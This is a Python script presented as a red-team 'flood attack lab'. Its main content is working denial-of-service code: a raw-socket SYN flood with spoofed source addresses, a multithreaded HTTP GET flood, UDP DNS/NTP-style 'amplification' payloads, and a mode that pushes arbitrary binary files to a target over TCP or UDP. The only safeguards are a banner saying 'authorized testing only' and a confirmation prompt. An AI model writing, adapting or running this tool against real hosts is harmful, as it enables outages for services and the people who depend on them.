#!/usr/bin/env python3
import random
import socket
import sys
import threading
import time
import os
import struct
import hashlib
from pathlib import Path

class UltimateFloodAttack:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.threads = 5000
        self.duration = 0
        self.packets_sent = 0
        self.running = False
        self.file_injection_mode = False
        self.binary_file = None
        self.chunk_size = 1024
        self.protocol = "TCP"
        self.injection_delay = 0.01
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def show_banner(self):
        self.clear_screen()
        print(r"""
  ____            _      _____ _                 
 |  _ \ ___  _ __| |_   |  ___| | ___  ___   ___
 | |_) / _ \| '__| __|  | |_  | |/ _ \/ __| / __|
 | |-/ |(_) | |  | |_   |  _| | | (_) \__ \ \__ \
 |_|   \___/|_|   \__|  |_|   |_|\___/|___/ |___/
        """)
        print("=== ULTIMATE FLOOD ATTACK LAB - RED TEAM ===")
        print("=== WITH BINARY FILE INJECTION MODULE =====")
        print("=== WARNING: FOR AUTHORIZED TESTING ONLY ===\n")
        
    def get_user_input(self):
        self.show_banner()
        
        # Attack mode selection
        print("Select Attack Mode:")
        print("1. Standard Flood Attacks")
        print("2. Binary File Injection (TCP/UDP)")
        
        while True:
            mode = input("\nChoose mode (1 or 2): ").strip()
            if mode == '1':
                self.file_injection_mode = False
                break
            elif mode == '2':
                self.file_injection_mode = True
                break
            else:
                print("Invalid selection. Enter 1 or 2.")
        
        if self.file_injection_mode:
            self.get_file_injection_config()
        else:
            self.get_flood_config()
            
        # Final confirmation
        self.show_banner()
        self.print_attack_summary()
        
        if input("\nType 'CONFIRM' to launch: ").strip().upper() != 'CONFIRM':
            print("Attack cancelled")
            sys.exit(0)
    
    def get_flood_config(self):
        """Get configuration for standard flood attacks"""
        # Target IP
        while True:
            self.target_ip = input("Target IP to attack: ").strip()
            try:
                socket.inet_aton(self.target_ip)
                break
            except:
                print("Invalid IP address")
                
        # Target Port
        while True:
            port = input("Target port (1-65535): ").strip()
            if port.isdigit() and 1 <= int(port) <= 65535:
                self.target_port = int(port)
                break
            print("Invalid port")
            
        # Threads
        threads = input(f"Threads [Default: {self.threads}]: ").strip()
        if threads.isdigit() and int(threads) > 0:
            self.threads = min(int(threads), 10000)
            
        # Duration
        duration = input("Duration in seconds (0=unlimited) [Default: 0]: ").strip()
        if duration.isdigit() and int(duration) >= 0:
            self.duration = int(duration)
    
    def get_file_injection_config(self):
        """Get configuration for binary file injection"""
        print("\n=== BINARY FILE INJECTION CONFIGURATION ===\n")
        
        # Target IP
        while True:
            self.target_ip = input("Target IP to send file to: ").strip()
            try:
                socket.inet_aton(self.target_ip)
                break
            except:
                print("Invalid IP address")
        
        # Target Port
        while True:
            port = input("Target port (1-65535): ").strip()
            if port.isdigit() and 1 <= int(port) <= 65535:
                self.target_port = int(port)
                break
            print("Invalid port")
        
        # Protocol selection
        while True:
            proto = input("Protocol (TCP/UDP) [Default: TCP]: ").strip().upper()
            if proto in ["TCP", "UDP", ""]:
                self.protocol = proto if proto else "TCP"
                break
            print("Invalid protocol. Choose TCP or UDP.")
        
        # Binary file selection
        while True:
            file_path = input("Path to binary file to inject: ").strip()
            if os.path.exists(file_path):
                self.binary_file = Path(file_path)
                file_size = os.path.getsize(file_path)
                print(f"File selected: {self.binary_file.name} ({file_size:,} bytes)")
                
                # Calculate suggested chunk size
                self.chunk_size = min(4096, max(512, file_size // 100))
                break
            else:
                print(f"File not found: {file_path}")
                create_sample = input("Create a sample binary file? (y/n): ").strip().lower()
                if create_sample == 'y':
                    self.create_sample_binary_file()
                    self.binary_file = Path("sample_binary.bin")
                    break
        
        # Chunk size configuration
        chunk_input = input(f"Chunk size in bytes [Default: {self.chunk_size}]: ").strip()
        if chunk_input.isdigit() and int(chunk_input) > 0:
            self.chunk_size = int(chunk_input)
        
        # Injection delay
        delay_input = input("Delay between chunks in seconds [Default: 0.01]: ").strip()
        if delay_input:
            try:
                self.injection_delay = float(delay_input)
            except:
                print("Invalid delay, using default")
        
        # Number of injections
        self.threads = 1  # For file injection, we typically use 1 thread
        repeat_input = input("Number of times to send file [Default: 1]: ").strip()
        if repeat_input.isdigit() and int(repeat_input) > 0:
            self.threads = min(int(repeat_input), 100)
    
    def create_sample_binary_file(self):
        """Create a sample binary file for testing"""
        sample_data = b'BINARY_FILE_SAMPLE' * 100
        with open("sample_binary.bin", "wb") as f:
            f.write(sample_data)
        print(f"Created sample_binary.bin ({len(sample_data)} bytes)")
    
    def print_attack_summary(self):
        """Print attack configuration summary"""
        if self.file_injection_mode:
            print(f"[!] BINARY FILE INJECTION MODE [!]")
            print(f"Target: {self.target_ip}:{self.target_port}")
            print(f"Protocol: {self.protocol}")
            print(f"File: {self.binary_file.name} ({self.binary_file.stat().st_size:,} bytes)")
            print(f"Chunk Size: {self.chunk_size:,} bytes")
            print(f"Delay: {self.injection_delay} seconds")
            print(f"Repeat: {self.threads} times")
        else:
            print(f"[!] FLOOD ATTACK MODE [!]")
            print(f"Target: {self.target_ip}:{self.target_port}")
            print(f"Threads: {self.threads:,}")
            print(f"Duration: {'Unlimited' if self.duration == 0 else f'{self.duration} seconds'}")
    
    def binary_file_injection(self):
        """Inject binary file over TCP or UDP in chunks"""
        try:
            # Read binary file
            with open(self.binary_file, 'rb') as f:
                file_data = f.read()
            
            file_size = len(file_data)
            file_hash = hashlib.md5(file_data).hexdigest()
            
            print(f"\n[+] File loaded: {file_size:,} bytes")
            print(f"[+] MD5 Hash: {file_hash}")
            print(f"[+] Protocol: {self.protocol}")
            print(f"[+] Chunk size: {self.chunk_size:,} bytes")
            print(f"[+] Starting injection...\n")
            
            for injection_num in range(self.threads):
                print(f"\n[+] Injection #{injection_num + 1}")
                
                if self.protocol == "TCP":
                    self.send_file_tcp(file_data, file_size, file_hash, injection_num)
                else:  # UDP
                    self.send_file_udp(file_data, file_size, file_hash, injection_num)
                
                if injection_num < self.threads - 1:
                    print(f"[+] Waiting 1 second before next injection...")
                    time.sleep(1)
            
            print(f"\n[+] All {self.threads} injections completed!")
            
        except Exception as e:
            print(f"\n[!] Error during file injection: {str(e)}")
    
    def send_file_tcp(self, file_data, file_size, file_hash, injection_num):
        """Send file over TCP with chunking"""
        try:
            # Create TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Connect to target
            print(f"[+] Connecting to {self.target_ip}:{self.target_port}...")
            sock.connect((self.target_ip, self.target_port))
            print(f"[+] Connected successfully")
            
            # Send file metadata
            metadata = struct.pack('!Q32s', file_size, file_hash.encode())
            sock.send(metadata)
            
            # Send file in chunks
            bytes_sent = 0
            start_time = time.time()
            
            for i in range(0, file_size, self.chunk_size):
                chunk = file_data[i:i + self.chunk_size]
                sock.send(chunk)
                bytes_sent += len(chunk)
                
                # Progress display
                progress = (bytes_sent / file_size) * 100
                print(f"\r[+] Sending: {bytes_sent:,}/{file_size:,} bytes ({progress:.1f}%)", end="")
                
                time.sleep(self.injection_delay)
                
                # Check if we should stop
                if not self.running:
                    break
            
            sock.close()
            elapsed = time.time() - start_time
            speed = bytes_sent / elapsed / 1024 if elapsed > 0 else 0
            print(f"\n[+] TCP injection #{injection_num + 1} completed in {elapsed:.2f}s ({speed:.1f} KB/s)")
            
        except socket.timeout:
            print(f"\n[!] TCP connection timeout")
        except Exception as e:
            print(f"\n[!] TCP error: {str(e)}")
    
    def send_file_udp(self, file_data, file_size, file_hash, injection_num):
        """Send file over UDP with chunking"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            print(f"[+] Starting UDP injection to {self.target_ip}:{self.target_port}")
            
            # Send file metadata in first packet
            metadata = struct.pack('!Q32sI', file_size, file_hash.encode(), injection_num)
            sock.sendto(metadata, (self.target_ip, self.target_port))
            
            # Send file in chunks
            bytes_sent = 0
            start_time = time.time()
            packet_num = 0
            
            for i in range(0, file_size, self.chunk_size):
                chunk = file_data[i:i + self.chunk_size]
                
                # Add sequence number to chunk
                chunk_with_seq = struct.pack('!I', packet_num) + chunk
                sock.sendto(chunk_with_seq, (self.target_ip, self.target_port))
                
                bytes_sent += len(chunk)
                packet_num += 1
                
                # Progress display
                progress = (bytes_sent / file_size) * 100
                print(f"\r[+] UDP Packets: {packet_num:,} | Bytes: {bytes_sent:,}/{file_size:,} ({progress:.1f}%)", end="")
                
                time.sleep(self.injection_delay)
                
                # Check if we should stop
                if not self.running:
                    break
            
            sock.close()
            elapsed = time.time() - start_time
            speed = bytes_sent / elapsed / 1024 if elapsed > 0 else 0
            print(f"\n[+] UDP injection #{injection_num + 1} completed: {packet_num:,} packets in {elapsed:.2f}s ({speed:.1f} KB/s)")
            
        except Exception as e:
            print(f"\n[!] UDP error: {str(e)}")
    
    # The original flood attack methods remain unchanged...
    def syn_flood(self):
        """High-volume SYN flood"""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Random source IP
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # Craft packet
                packet = (
                    bytes([0x45, 0x00]) +                   # Version/IHL, ToS
                    (40).to_bytes(2, 'big') +               # Total Length
                    random.randint(1,65535).to_bytes(2,'big') + # Identification
                    (0x4000).to_bytes(2, 'big') +           # Flags/Fragment
                    (255).to_bytes(1, 'big') +              # TTL
                    (6).to_bytes(1, 'big') +                # Protocol (TCP)
                    (0).to_bytes(2, 'big') +                # Header checksum
                    socket.inet_aton(src_ip) +              # Source IP
                    socket.inet_aton(self.target_ip) +      # Destination IP
                    
                    # TCP Header
                    random.randint(1024,65535).to_bytes(2,'big') + # Source port
                    self.target_port.to_bytes(2,'big') +    # Destination port
                    random.randint(0,4294967295).to_bytes(4,'big') + # Sequence
                    (0).to_bytes(4, 'big') +                # Ack number
                    (0x5002).to_bytes(2, 'big') +           # Header length + SYN
                    (5840).to_bytes(2, 'big') +             # Window size
                    (0).to_bytes(2, 'big') +                # Checksum
                    (0).to_bytes(2, 'big')                  # Urgent pointer
                )
                
                s.sendto(packet, (self.target_ip, self.target_port))
                self.packets_sent += 1
                s.close()
            except:
                pass
                
    def http_flood(self):
        """HTTP GET flood"""
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept: text/html,application/xhtml+xml",
            "Connection: keep-alive"
        ]
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                
                for _ in range(100):
                    request = (
                        f"GET /?{random.randint(0,100000)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"{random.choice(headers)}\r\n\r\n"
                    )
                    s.send(request.encode())
                    self.packets_sent += 1
                s.close()
            except:
                pass
                
    def udp_amplification(self):
        """UDP amplification attack"""
        payloads = [
            bytes.fromhex("AAAA01000001000000000000") + b"\x07example\x03com\x00\x00\x01\x00\x01",
            bytes.fromhex("1b00" + "00"*468)
        ]
        
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random.choice(payloads), (self.target_ip, self.target_port))
                self.packets_sent += 1
                s.close()
            except:
                pass
    
    def start_attack(self):
        self.running = True
        
        if self.file_injection_mode:
            # Binary file injection mode
            print(f"\n[!] Starting binary file injection to {self.target_ip}:{self.target_port}")
            print(f"[!] Protocol: {self.protocol}")
            
            # Create threads for multiple injections if configured
            threads = []
            for _ in range(self.threads):
                t = threading.Thread(target=self.binary_file_injection)
                t.daemon = True
                threads.append(t)
            
            # Start all threads
            for t in threads:
                t.start()
                time.sleep(0.1)  # Small delay between thread starts
            
            # Wait for all injections to complete
            for t in threads:
                t.join()
                
        else:
            # Original flood attack mode
            threads = []
            attack_methods = [self.syn_flood, self.http_flood, self.udp_amplification]
            
            print(f"\n[!] Launching flood attack on {self.target_ip}:{self.target_port}")
            print(f"[!] Using {self.threads:,} threads")
            
            # Create and start threads
            for method in attack_methods:
                for _ in range(self.threads // len(attack_methods)):
                    t = threading.Thread(target=method)
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            # Monitor attack
            try:
                start_time = time.time()
                while self.running:
                    elapsed = time.time() - start_time
                    print(f"\r[+] Attacking: {elapsed:.1f}s | Packets: {self.packets_sent:,}", end="")
                    
                    if self.duration > 0 and elapsed >= self.duration:
                        self.stop()
                    time.sleep(0.1)
                    
            except KeyboardInterrupt:
                self.stop()
            
        print("\n[!] Attack completed")
        
    def stop(self):
        self.running = False

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Error: This script requires root privileges")
        sys.exit(1)
        
    attack = UltimateFloodAttack()
    attack.get_user_input()
    attack.start_attack()